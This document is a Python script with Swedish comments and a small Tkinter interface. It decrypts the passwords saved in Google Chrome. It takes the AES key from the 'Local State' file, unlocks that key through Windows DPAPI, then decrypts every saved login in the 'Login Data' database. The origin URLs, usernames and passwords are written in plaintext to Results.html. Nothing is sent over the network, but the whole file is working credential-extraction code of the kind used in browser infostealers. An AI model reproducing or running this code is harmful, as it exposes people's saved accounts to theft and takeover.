import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import tkinter as tk

def get_chrome_datetime(chromedate):
    """Fixar tidstämplar eftersom `chromedate` är formaterat som antalet mikrosekunder sedan januari 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = "Local State"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # avkoda krypteringsnyckeln från Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    # returnera dekrypterad nyckel som ursprungligen krypterades
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # få initialiseringsvektorn
        iv = password[3:15]
        password = password[15:]
        # generera chiffer
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # dekryptera lösenordet
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # stöds inte
            return ""

def process_passwords():
    # hämta AES-nyckeln
    key = get_encryption_key()
    # sökväg till den lokala SQLite-databasen för Chrome
    db_path = "Login Data"
    # kopiera filen till en annan plats
    # eftersom databasen kommer att vara låst om Chrome körs för tillfället
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # anslut till databasen
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # tabellen `logins` innehåller den data vi behöver
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterera över alla rader

    results = open("Results.html", "w")
    results.write("<html>\n<head>\n<title>Password Results</title>\n</head>\n<body>\n")

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]

        if username or password:
            results.write(f"<p><strong>Ursprungs-URL:</strong> {origin_url}</p>\n")
            results.write(f"<p><strong>Åtgärds-URL:</strong> {action_url}</p>\n")
            results.write(f"<p><strong>Användarnamn:</strong> {username}</p>\n")
            results.write(f"<p><strong>Lösenord:</strong> {password}</p>\n")
        else:
            continue

        if date_created != 86400000000 and date_created:
            results.write(f"<p><strong>Skapades den:</strong> {str(get_chrome_datetime(date_created))}</p>\n")

        if date_last_used != 86400000000 and date_last_used:
            results.write(f"<p><strong>Senast använd:</strong> {str(get_chrome_datetime(date_last_used))}</p>\n")

        results.write("<hr>\n")

    results.write("</body>\n</html>")
    results.close()

    cursor.close()
    db.close()

    try:
        # försöker ta bort den kopierade databasfilen
        os.remove(filename)
    except:
        pass

    # Display a message box after processing the passwords
    tk.messagebox.showinfo("Password Extraction", "The passwords have been extracted successfully.")

def create_gui():
    root = tk.Tk()
    root.title("Password Extraction")
    root.geometry("300x100")

    instructions = tk.Label(root, text="Make sure you have extracted the files 'Local State' and 'Login Data' into the same folder as the script, the results will be saved in a HTML file called Results", wraplength=280)
    instructions.pack()

    button = tk.Button(root, text="Extract Passwords", command=process_passwords)
    button.pack(side=tk.BOTTOM, pady=10)

    root.mainloop()

if __name__ == "__main__":
    create_gui()